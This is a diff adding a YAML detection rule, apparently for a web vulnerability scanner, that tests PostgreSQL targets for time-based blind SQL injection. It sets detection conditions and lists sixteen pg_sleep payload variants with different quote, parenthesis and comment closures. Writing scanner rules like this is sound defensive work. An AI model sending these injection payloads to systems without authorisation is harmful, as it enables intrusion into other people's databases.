@@ -1,0 +1,38 @@
+id: "sqli-time-pg"
+issue_code: sql_injection
+detection_conditions: or
+detection_methods:
+  - time_based:
+      sleep: "{{.sleep_time}}"
+      confidence: 80
+  - response_condition:
+      status_code: 500
+      confidence: 50
+  - response_check:
+      check: database_error
+      confidence: 90
+vars:
+  - name: sleep_time
+    value: "{{randomInt 5 9}}"
+templates:
+  - pg_sleep({{.sleep_time}})--
+  - 1 or pg_sleep({{.sleep_time}})--
+  - '" or pg_sleep({{.sleep_time}})--'
+  - "' or pg_sleep({{.sleep_time}})--"
+  - 1) or pg_sleep({{.sleep_time}})--
+  - '") or pg_sleep({{.sleep_time}})--'
+  - "') or pg_sleep({{.sleep_time}})--"
+  - 1)) or pg_sleep({{.sleep_time}})--
+  - '")) or pg_sleep({{.sleep_time}})--'
+  - "')) or pg_sleep({{.sleep_time}})--"
+  - pg_SLEEP({{.sleep_time}})
+  - pg_SLEEP({{.sleep_time}})--
+  - pg_SLEEP({{.sleep_time}})#
+  - or pg_SLEEP({{.sleep_time}})
+  - or pg_SLEEP({{.sleep_time}})--
+  - or pg_SLEEP({{.sleep_time}})#
+categories:
+  - sql_injection
+  - time_based
+platforms:
+  - postgresql
